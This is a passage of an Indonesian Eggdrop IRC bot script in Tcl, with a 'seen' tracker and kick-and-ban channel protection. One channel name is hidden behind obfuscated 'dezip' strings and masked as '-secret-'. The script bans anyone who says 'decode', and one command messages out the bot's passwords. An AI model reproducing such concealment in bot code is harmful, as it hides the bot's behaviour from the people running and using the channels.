        delhost $x $y
      }
      set hostmask "${x}!*@*"
      setuser $x HOSTS $hostmask
    }
  }
  if {![validuser "AKICK"]} {
    set hostmask "telnet!*@*"
    adduser "AKICK" $hostmask
    chattr "AKICK" "-hp"
    chattr "AKICK" "K"
  }
  if {![validuser $owner]} {
    set hostmask "$owner!*@*"
    adduser $owner $hostmask
    chattr $owner "Zfhjmnoptx"
  }
  saveuser
}

utimer 1 {config}
utimer 2 {seen}

proc uncolor {s} {
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all --  $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\],\[0-9\] $s "" s
  regsub -all -- \[0-9\]\[0-9\] $s "" s
  regsub -all -- \[0-9\] $s "" s
  return $s
}

proc msg_botset {unick uhost hand rest} {
  global nick nickpass altpass altnick own fxlogo1
  if {$unick != $own} {
    return 0
  }
  puthlp "NOTICE $unick :$fxlogo1 1st $nick ($nickpass) 2nd $altnick ($altpass)"
  return 0
}

proc msg_reuser {nick uhost hand rest} {
  global botnick owner fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$nick != $owner} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  foreach x [userlist] {
    if {($x != "config") && ($x != "AKICK")} { deluser $x }
  }
  adduser $owner "$owner!*@*"
  chattr $owner "Zfhjmnoptx"
  puthlp "NOTICE $nick :$fxlogo1 Reseting UsER sucessfully, set pass 1st."
  saveuser
}

#################
## SEEN SYSTEM ##
#################
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c

proc seen {} {
  global version fxlogo1 fxlogo2
  catch { unbind time - "12 * * * *" bs_timedsave }
  catch { unbind time -  "*1 * * * *" bs_trim }
  catch { unbind join -|- * bs_join_botidle }
  catch { unbind join -|- * bs_join }
  catch { unbind sign -|- * bs_sign }
  catch { unbind kick -|- * bs_kick }
  catch { unbind nick -|- * bs_nick }
  catch { unbind splt -|- * bs_splt }
  catch { unbind rejn -|- * bs_rejn }
  catch { unbind chjn -|- * bs_chjn }
  catch { unbind chpt -|- * bs_chpt }
  catch { unbind bot -|- bs_botsearch bs_botsearch }
  catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
  catch { unbind pub -|- [string trim "!"]seen pub_seen }
  catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
  catch { unbind part -|- * bs_part_oldver }
  catch { unbind chof -|- * bs_chof }
  set mSEEN "F"
  foreach x [channels] {
    set cinfo [channel info $x]
    if {[string match "*+seen*" $cinfo]} {
      set mSEEN "T"
    }
  }
  if {$mSEEN == "F"} {return 0}
  bind time - "12 * * * *" bs_timedsave
  bind time -  "*1 * * * *" bs_trim
  bind join -|- * bs_join_botidle
  bind join -|- * bs_join
  bind sign -|- * bs_sign
  bind kick -|- * bs_kick
  bind nick -|- * bs_nick
  bind splt -|- * bs_splt
  bind rejn -|- * bs_rejn
  bind chjn -|- * bs_chjn
  bind chpt -|- * bs_chpt
  bind bot -|- bs_botsearch bs_botsearch
  bind bot -|- bs_botsearch_reply bs_botsearch_reply
  bind pub -|- !seen pub_seen
  bind pub -|- !seennick bs_pubreq2
  if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
  if {[string trimleft [lindex $version 1] 0] >= 1050000} {
    bind part -|- * bs_part
  } else {
    if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
    bind part -|- * bs_part_oldver
  }
  foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
  if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
  if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
  if {[info exists bs_list]} {
    if {[info exists bs(oldver)]} {
      if {$bs(oldver) < $bs(updater)} {bs_update}
    } else { bs_update }
  }
}

utimer 2 seen

proc bs_filt {data} {
  regsub -all -- \\\\ $data \\\\\\\\ data
  regsub -all -- \\\[ $data \\\\\[ data
  regsub -all -- \\\] $data \\\\\] data
  regsub -all -- \\\} $data \\\\\} data
  regsub -all -- \\\{ $data \\\\\{ data
  regsub -all -- \\\" $data \\\\\" data
  return $data
}
proc bs_flood_init {} {
  global bs bs_flood_array
  if {![string match *:* $bs(flood)]} {return}
  set bs(flood_num) [lindex [split $bs(flood) :] 0]
  set bs(flood_time) [lindex [split $bs(flood) :] 1]
  set i [expr $bs(flood_num) - 1]
  while {$i >= 0} {
    set bs_flood_array($i) 0
    incr i -1
  }
}

bs_flood_init

proc bs_flood {nick uhost} {
  global bs bs_flood_array
  if {$bs(flood_num) == 0} {return 0}
  set i [expr $bs(flood_num) - 1]
  while {$i >= 1} {
    set bs_flood_array($i) $bs_flood_array([expr $i - 1])
    incr i -1
  }
  set bs_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
    if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)}
    return 1
  } else { return 0 }
}

proc bs_read {} {
  global bs_list userfile bs
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
    set temp [split $userfile /]
    set temp [lindex $temp [expr [llength $temp]-1]]
    set name [lindex [split $temp .] 0]
  }
  if {![file exists $bs(path)bs_data.$name]} {
    if {![file exists $bs(path)bs_data.$name.bak]} {
      return
    } else {
      exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name
    }
  }
  set fd [open $bs(path)bs_data.$name r]
  set bsu_ver ""
  set break 0
  while {![eof $fd]} {
    set inp [gets $fd]
    if {[eof $fd]} {break}
    if {[string trim $inp " "] == ""} {continue}
    if {[string index $inp 0] == "#"} {
      set bsu_version [string trimleft $inp #]
      continue
    }
    if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
      if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
      if {$temp || [bsu_go] || [bsu_finish]} {
        rehashing
      }
      set break 1
      break
    }
    set nick [lindex $inp 0]
    set bs_list([string tolower $nick]) $inp
  }
  close $fd
  if {$break} {bs_read}
}

proc bs_update {} {
  global bs
  bs_save
  bs_read
}

proc bs_timedsave {min b c d e} { bs_save }
proc bs_save {} {
  global bs_list userfile bs fxlogo1
  if {[array size bs_list] == 0} {return}
  if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
    set temp [split $userfile /]
    set temp [lindex $temp [expr [llength $temp]-1]]
    set name [lindex [split $temp .] 0]
  }
  if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
  set fd [open $bs(path)bs_data.$name w]
  set id [array startsearch bs_list]
  puts $fd "#$bs(updater)"
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    puts $fd "$bs_list($item)"
  }
  array donesearch bs_list $id
  close $fd
}

proc bs_part_oldver {a b c d} { bs_part $a $b $c $d "" }

proc bs_part {nick uhost hand chan reason} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}

proc bs_join {nick uhost hand chan} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  bs_add $nick "[list $uhost] [unixtime] join $chan"
}

proc bs_sign {nick uhost hand chan reason} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}

proc bs_kick {nick uhost hand chan knick reason} {
  set schan $chan
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set schan "-secret-"
  }
  bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}

proc bs_nick {nick uhost hand chan newnick} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  set time [unixtime]
  bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]"
  bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}

proc bs_splt {nick uhost hand chan} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  bs_add $nick "[list $uhost] [unixtime] splt $chan"
}

proc bs_rejn {nick uhost hand chan} {
  if {[string tolower $chan] == [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
    set chan "-secret-"
  }
  bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}

proc bs_chjn {bot hand channum flag sock from} {
  bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"
}

proc bs_chpt {bot hand args} {
  set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}
}

proc bs_botsearch {from cmd args} {
  global botnick fxlogo1
  set args [join $args]
  set command [lindex $args 0]
  set target [lindex $args 1]
  set nick [lindex $args 2]
  set search [bs_filt [join [lrange $args 3 e]]]
  if {[string match *\\\** $search]} {
    set output [bs_seenmask bot $nick $search]
    if {$output != "Ga ada yang cocok." && ![string match "I'm not on *" $output]} { putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}" }
  } else {
    set output [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
    if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
  }
}

proc bs_botsearch_reply {from cmd args} {
  global fxlogo1 bs
  set args [join $args]
  if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
  if {![info exists bs(bot_delay)]} {
    set bs(bot_delay) on
    utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}}
    if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
      puthlp "[lindex $args 1] :[join [lindex $args 2]]"
    }
  }
}

proc pub_seen {nick uhost hand chan args} { bs_pubreq $nick $uhost $hand $chan $args 0 }

proc bs_pubreq2 {nick uhost hand chan args} { bs_pubreq $nick $uhost $hand $chan $args 1 }

proc bs_pubreq {nick uhost hand chan args no} {
  global botnick bs fxlogo1
  if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
  if {[bs_flood $nick $uhost]} {return 0}
  set i 0
  if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
  if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
  set args [bs_filt [join $args]]
  set target "NOTICE $nick"
  if {[string match *\\\** [lindex $args 0]]} {
    set output [bs_seenmask $chan $hand $args]
    if {$output == "Ga ada yang cocok."} { putallbots "bs_botsearch 1 \{$target\} $nick $args" }
    if {[string match "Gue ga ada di *" $output]} { putallbots "bs_botsearch 1 \{$target\} $nick $args" }
    regsub -all -- ~ $output "" output
    puthlp "$target :[lgrnd] $output"
    return $bs(logqueries)
  }
  set data [bs_filt [string trimright [lindex $args 0] ?!.,]]
  if {[string tolower $nick] == [string tolower $data]} {
    puthlp "PRIVMSG $chan :nGaCa DuLu DoNk $nick!"
    return $bs(logqueries)
  }
  if {[string tolower $data] == [string tolower $botnick] } {
    puthlp "PRIVMSG $chan :\001ACTION aDa DisiNi!\001"
    return $bs(logqueries)
  }
  if {[onchan $data $chan]} {
    puthlp "PRIVMSG $chan :$nick, $data aDa DisiNi!"
    return $bs(logqueries)
  }
  set output [bs_output $chan $nick $data $no]
  if {$output == 0} {return 0}
  if {[lrange [split $output] 1 4] == "Gue gA LiAt"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
  regsub -all -- ~ $output "" output
  puthlp "$target :[lgrnd] $output"
  return $bs(logqueries)
}

proc bs_seenmask {ch nick args} {
  global bs_list bs fxlogo1
  set matches ""
  set temp ""
  set i 0
  set args [join $args]
  set chan [lindex $args 1]
  if {$chan != "" && [string trimleft $chan #] != $chan} {
    if {![validchan $chan]} {return "Gue ga ada di $chan."} {set chan [string tolower $chan]}
  } else {
    set chan ""
  }
  if {![info exists bs_list]} {return "Ga ada yang cocok."}
  set data [bs_filt [string tolower [lindex $args 0]]]
  set maskfix 1
  while $maskfix {
    set mark 1
    if [regsub -all -- \\?\\? $data ? data] {set mark 0}
    if [regsub -all -- \\*\\* $data * data] {set mark 0}
    if [regsub -all -- \\*\\? $data * data] {set mark 0}
    if [regsub -all -- \\?\\* $data * data] {set mark 0}
    if $mark {break}
  }
  set id [array startsearch bs_list]
  while {[array anymore bs_list $id]} {
    set item [array nextelement bs_list $id]
    if {$item == ""} {continue}
    set i 0
    set temp ""
    set match [lindex $bs_list($item) 0]
    set addy [lindex $bs_list($item) 1]
    if {[string match $data $item![string tolower $addy]]} {
      set match [bs_filt $match]
      if {$chan != ""} {
        if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
      } else { set matches [concat $matches $match] }
    }
  }
  array donesearch bs_list $id
  set matches [string trim $matches " "]
  if {$nick == "?"} {return [bs_filt $matches]}
  set len [llength $matches]
  if {$len == 0} {return "Ga ada yg cocok."}
  if {$len == 1} {return [bs_output $ch $nick $matches 1]}
  if {$len > 99} {return "Ada $len yang cocok. Mohon perbaiki pencarian anda."}
  set matches [bs_sort $matches]
  if {$len <= 5} {
    set output [concat Ada $len yang cocok: [join $matches].]
  } else {
    set output "Ada $len yang cocok. 5 terakhir: [join [lrange $matches 0 4]]."
  }
  return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}

proc bs_output {chan nick data no} {
  global botnick bs version bs_list
  set data [string tolower [string trimright [lindex $data 0] ?!.,]]
  if {$data == ""} {return 0}
  if {[string tolower $nick] == $data} {return [concat $nick, go look in a mirror.]}
  if {$data == [string tolower $botnick]} {return [concat $nick, Gue ada disini. Keluar menghabiskan waktu!]}
  if {[string length $data] > $bs(nicksize)} {return 0}
  if {$bs(smartsearch) != 1} {set no 1}
  if {$no == 0} {
    set matches ""
    set hand ""
    set addy ""
    if {[lsearch -exact [array names bs_list] $data] != "-1"} {
      set addy [lindex $bs_list([string tolower $data]) 1]
      set hand [finduser $addy]
      foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
    }
    if {[validuser $data]} {set hand $data}
    if {$hand != "*" && $hand != ""} {
      if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
      foreach addr $hosts {
        foreach item [string tolower [bs_seenmask dcc ? $addr]] {
          if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
        }
      }
    }
    if {$matches != ""} {
      set matches [string trimleft $matches " "]
      set len [llength $matches]
      if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
      if {$len > 99} {return [concat Ada $len yg cocok. Mohon perbaiki pencarian anda.]}
      set matches [bs_sort $matches]
      set key [lindex $matches 0]
      if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
      if {$len <= 5} {
        set output [concat $len terakhir: [join $matches].]
        set output [concat $output [bs_search $chan $key]]
        return $output
      } else {
        set output [concat ada $len yg cocok. 5 terakhir: [join [lrange $matches 0 4]].]
        set output [concat $output [bs_search $chan $key]]
        return $output
      }
    }
  }
  set temp [bs_search $chan $data]
  if {$temp != 0} { return $temp } {
    #$data not found in $bs_list, so search userfile
    if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} {
      return "$nick, gue ga liat $data"
    } else {
      set seen [getuser $data laston]
      if {[getuser $data laston] == ""} {return "$nick, gue ga list $data"}
      if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
        set chan "-secret-"
      } else {
        set chan [lindex $seen 1]
      }
      return [concat $nick, $data terakhir gue liat di $chan [bs_when [lindex $seen 0]] yg lalu.]
    }
  }
}

proc bs_search {chan n} {
  global bs_list fxlogo1
  if {![info exists bs_list]} {return 0}
  if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} {
    set data [split $bs_list([string tolower $n])]
    set n [join [lindex $data 0]]
    set addy [lindex $data 1]
    set time [lindex $data 2]
    set marker 0
    if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
      set chan "-secret-"
    } else {
      set chan [lindex $data 4]
    }
    
    switch -- [lindex $data 3] {
      part {
        set reason [lrange $data 5 e]
        if {$reason == "{}"} {set reason "."} {set reason " Pesan \"$reason\"."}
        set output [concat $n ($addy) part dari $chan [bs_when $time] yg lalu. $reason]
      }
      quit {
        set reason [lrange $data 5 e]
        if {$reason == "Quit: {{}}"} {
          set reason "."
        } {
          set reason " Status: $reason."
        }
        set output [concat $n ($addy) quit dari $chan [bs_when $time] yg lalu. $reason]
      }
      kick {
        set output [concat $n ($addy) dikick dari $chan by [lindex $data 5] [bs_when $time] ago dg pesan ([join [lrange $data 6 e]]).]
      }
      rnck {
        set output [concat $n ($addy) ganti nick dari [lindex $data 5] di [lindex $data 4] [bs_when $time] yg lalu.]
        if {[validchan [lindex $data 4]]} {
          if {[onchan $n [lindex $data 4]]} {
            set output [concat $output $n masih disini.]
          } else {
            set output [concat $output $n ga keliatan sekarang.]
          }
        }
      }
      nick {
        set output [concat $n ($addy) ganti nick ke [lindex $data 5] di [lindex $data 4] [bs_when $time] yg lalu.]
      }
      splt {
        set output [concat $n ($addy) part dari $chan karena split [bs_when $time] yg lalu.]
      }
      rejn {
        set output [concat $n ($addy) join kembali ke $chan dari split [bs_when $time] yg lalu.]
        if {[validchan $chan]} {
          if {[onchan $n $chan]} {
            set output [concat $output $n masih di $chan.]
          } else {
            set output [concat $output Gue ga liat $n di $chan sekarang.]
          }
        }
      }
      join {
        set output [concat $n ($addy) join ke $chan [bs_when $time] yg lalu.]
        if {[validchan $chan]} {
          if {[onchan $n $chan]} {
            set output [concat $output $n masih di $chan.]
          } else {
            set output [concat $output $n ga keliatan di $chan sekarang.]
          }
        }
      }
      away {
        set reason [lrange $data 5 e]
        if {$reason == ""} {
          set output [concat $n ($addy) returning to the partyline on $chan [bs_when $time] ago.]
        } else {
          set output [concat $n ($addy) lagi away ($reason) di $chan [bs_when $time] yg lalu.]
        }
      }
      chon {
        set output [concat $n ($addy) joining the partyline [bs_when $time] ago.]
        set lnick [string tolower $n]
        foreach item [whom *] {
          if {$lnick == [string tolower [lindex $item 0]]} {
            set output [concat $output $n is on the partyline right now.]
            set marker 1
            break
          }
        }
        if {$marker == 0} {
          set output [concat $output I don't see $n on the partyline now, though.]
        }
      }
      chof {
        set output [concat $n ($addy) leaving the partyline [bs_when $time] ago.]
        set lnick [string tolower $n]
        foreach item [whom *] {
          if {$lnick == [string tolower [lindex $item 0]]} {
            set output [concat $output $n is on the partyline in [lindex $item 1] still.]
            break
          }
        }
      }
      chjn {
        set output [concat $n ($addy) joining the partyline on $chan [bs_when $time] ago.]
        set lnick [string tolower $n]
        foreach item [whom *] {
          if {$lnick == [string tolower [lindex $item 0]]} {
            set output [concat $output $n is on the partyline right now.]
            set marker 1
            break
          }
        }
        if {$marker == 0} {
          set output [concat $output I don't see $n on the partyline now, though.]
        }
      }
      chpt {
        set output [concat $n ($addy) leaving the partyline from $chan [bs_when $time] ago.]
        set lnick [string tolower $n]
        foreach item [whom *] {
          if {$lnick == [string tolower [lindex $item 0]]} {
            set output [concat $output $n is on the partyline in [lindex $item 1] still.]
            break
          }
        }
      }
      default {set output "error"}
    }
    return $output
  } else { return 0 }
}

proc bs_when {lasttime} {
  set years 0
  set days 0
  set hours 0
  set mins 0
  set time [expr [unixtime] - $lasttime]
  if {$time < 60} {return "baru $time detik"}
  if {$time >= 31536000} {
    set years [expr int([expr $time/31536000])]
    set time [expr $time - [expr 31536000*$years]]
  }
  if {$time >= 86400} {
    set days [expr int([expr $time/86400])]
    set time [expr $time - [expr 86400*$days]]
  }
  if {$time >= 3600} {
    set hours [expr int([expr $time/3600])]
    set time [expr $time - [expr 3600*$hours]]
  }
  if {$time >= 60} {
    set mins [expr int([expr $time/60])]
  }
  if {$years == 0} {
    set output ""
  } elseif {$years == 1} { set output "1 tahun," } else { set output "$years tahun," }
  if {$days == 1} {lappend output "1 hari,"} elseif {$days > 1} {lappend output "$days hari,"}
  if {$hours == 1} {lappend output "1 jam,"} elseif {$hours > 1} {lappend output "$hours jam,"}
  if {$mins == 1} {lappend output "1 menit"} elseif {$mins > 1} {lappend output "$mins menit"}
  return [string trimright [join $output] ", "]
}

proc bs_add {nick data} {
  global bs_list bs
  if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
  set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}

proc bs_lsortcmd {a b} {
  global bs_list
  set a [lindex $bs_list([string tolower $a]) 2]
  set b [lindex $bs_list([string tolower $b]) 2]
  if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}
}
proc bs_trim {min h d m y} {
  global bs bs_list
  if {![info exists bs_list] || ![array exists bs_list]} {return}
  set list [array names bs_list]
  set range [expr [llength $list] - $bs(limit) - 1]
  if {$range < 0} {return}
  set list [lsort -increasing -command bs_lsortcmd $list]
  foreach item [lrange $list 0 $range] {unset bs_list($item)}
}

proc bs_sort {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}

proc bs_join_botidle {nick uhost hand chan} {
  global bs_botidle botnick fxlogo1
  if {$nick == $botnick} {
    set bs_botidle([string tolower $chan]) [unixtime]
  }
}
########################
## END OF SEEN SYSTEM ##
########################

proc action_chk {nick host hand chan keyword arg} {
  global botnick
  if {$nick == $botnick} { return 0 }
  if {[matchattr $nick Z]} {
    set arg "`$arg"
  }
  if {![validchan $chan]} {
    msg_prot $nick $host $hand $arg
  } else {
    repeat_pubm $nick $host $hand $chan $arg
  }
}

proc repeat_pubm {nick uhost hand chan text} {
  global repeat_last botnick fxlogo1 kops fz owner ismaskhost is_m
  global botnick capsnick deopme repeat_person quick bannick fxlogo3
  regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
  regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
  regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
  pub_Z $nick $uhost $hand $chan $text
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  set real $text
  set text [uncolor $text]
  if {$nick == "ChanServ"} {
    if {[string match "*has deopped $botnick*" $text]} {
      if {![matchattr [lindex $text 0] f]} {
        if {[matchattr $cflag D]} {
          set deopme [lindex $text 0]
        }
      }
    }
    return 0
  }
  if {[matchattr $nick f]} { return 0 }
  set mhost [string range $uhost [string first "@" $uhost] end]
  if {$nick == $botnick} { return 0 }
  set resume "T"
  if {[string match "*-greet*" [channel info $chan]]} {
    set resume "F"
  }
  if {![isop $botnick $chan]} {
    set resume "F"
  }
  if {![info exists kops]} {
    if {[isop $nick $chan]} {
      set resume "F"
    }
    if {[isvoice $nick $chan]} {
      set resume "F"
    }
  }
  # Tsunami Flood PRoTECTION
  if {[string length $text] > 100} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} {
      if [isflood [string index $real $cnt]] {
        incr chr
      }
      incr cnt
    }
    if {$chr > 30} {
      if {$resume == "T"} {
        set bannick($nick) "*!*$mhost"
        if {![isutimer "TsunamI $chan"]} {
          utimer 30 [list putlog "&#171;Bombat&#187; TsunamI $chan"]
        } elseif {[info exists ismaskhost]} {
          set bannick($nick) [maskhost "*!*$mhost"]
        }
        if {$quick == "1" && ![info exists is_m($chan)]} {
          putqck "KICK $chan $nick :$fxlogo3 1abusing 4TSUNAMI [banms]"
        } else {
          putsrv "KICK $chan $nick :$fxlogo3 1abusing 4TSUNAMI [banms]"
        }
      }
      return 0
    }
  }
  if {![info exists kops]} {
    if {$resume == "F"} { return 0 }
  }
  if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
    putsrv "KICK $chan $nick :$fxlogo1 1gO LooK in a 4mIRRoR1..!"
    return 0
  }
  if {[string match "*decode*" [string tolower $text]]} {
    set bannick($nick) "*!*$mhost"
    putsrv "KICK $chan $nick :$fxlogo1 4DECODE1 ... [banmsg]"
    return 0
  }
  if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
    foreach x [channels] {
      set chksiton [string tolower $x]
      if {[string match "*$chksiton*" [string tolower $text]]} { return }
    }
    foreach seekchan $text {
      if {[string match "*#*" $seekchan]} {
        set bannick($nick) "*!*$mhost"
        putsrv "KICK $chan $nick :$fxlogo1 4INVITER1 dari: 4$seekchan [banms]"
        return 0
      }
    }
  }
  if {[string match "*http://*" [string tolower $text]] || [string match "*www.*.*" [string tolower $text]]} {
    set bannick($nick) "*!*$mhost"
    putsrv "KICK $chan $nick :$fxlogo1 4ADVERTISING1 is illegal in 4[string toupper $chan] [banms]"
    return 0
  }
  if {[matchattr $cflag R]} {
    if {[info exists repeat_last($mhost$chan)]} {
      if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
        if {![info exists repeat_person($mhost$chan)]} {
          set repeat_person($mhost$chan) 1
        } else {
          incr repeat_person($mhost$chan)
        }
        if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
          set bannick($nick) "*!*$mhost"
          putsrv "KICK $chan $nick :$fxlogo1 4REPEAT 1from: 4$mhost (1max:4 [getuser $cflag XTRA "RPT"]"
          catch {unset repeat_person($mhost$chan)}
          catch {unset repeat_last($mhost$chan)}
          return 0
        }
      }
    }
    set repeat_last($mhost$chan) $text
  }
  if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
    catch {unset repeat_person($mhost$chan)}
    catch {unset repeat_last($mhost$chan)}
    set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
    set bannick($nick) $banmask
    if {![isutimer "OL $chan"]} {
      utimer 10 [list putlog "&#171;Bombat&#187; OL $chan"]
      putsrv "KICK $chan $nick :$fxlogo1 4LONG TEXT1! max:4 [getuser $cflag XTRA "CHAR"]1 CHaRs [banmsg]"
    } else {
      putsrv "KICK $chan $nick :$fxlogo3 4LONG TEXT1! max:4 [getuser $cflag XTRA "CHAR"]1 CHaRs [banmsg]"
    }
    return 0
  }
  if {[matchattr $cflag U]} {
    set len [string length $text]
    if {[isbad $nick $uhost $chan $text]} { return 0 }
    if {$len < 30} { return 0 }
    set cnt 0
    set capcnt 0
    while {$cnt < $len} {
      if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
        incr capcnt
      }
      incr cnt
    }
    if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
      if {![info exists capsnick($nick)]} {
        putsrv "KICK $chan $nick :$fxlogo1 1excessive 4CAPSLOCK (4 [getuser $cflag XTRA "CAPS"]%"
        set capsnick($nick) "1"
        return 0
      }
      set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
      set bannick($nick) $banmask
      putsrv "KICK $chan $nick :$fxlogo11this is your 2nd warning, stop use excessive 4CAPSLOCK (4 [getuser $cflag XTRA "CAPS"]% "
      unset capsnick($nick)
    }
  }
}
proc isupper {letter} {
  set caps { A B C D E F G H I J K L M N O P Q R S T U V W X Y Z }
  if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 }
}

proc isflood {letter} {
  set caps {! @ # $ % ^ & * ( ) | [ ] < > / \ =     }
  if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 }
}

proc isbad {nick uhost chan arg} {
  global badwords botnick fxlogo1 bannick
  set arg [string tolower $arg]
  if {[string match "*-greet*" [channel info $chan]]} {
    set isbad 0
    return 0
  }
  foreach badword [string tolower $badwords] {
    if {[string match *$badword* [string tolower $arg]]} {
      set bannick($nick) "*!$uhost"
      putsrv "KICK $chan $nick :$fxlogo1 4BADWORD1 match from: 4[string toupper $badword]"
      return 1
    }
  }
  set isbad 0
  return 0
}

proc set_-m {chan} {
  if {[isutimer "set_-m $chan"]} { return 0 }
  if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
    putserv "mode $chan -m"
  }
}

proc topic_chk {nick host handle chan topic} {
  global botnick fxlogo1 bannick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $cflag I]} { return 0 }
  if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
  if {[matchattr $nick m]} {
    setuser $cflag XTRA "TOPIC" [topic $chan]
    saveuser
    return 0
  }
  if {![isop $botnick $chan]} { return 0 }
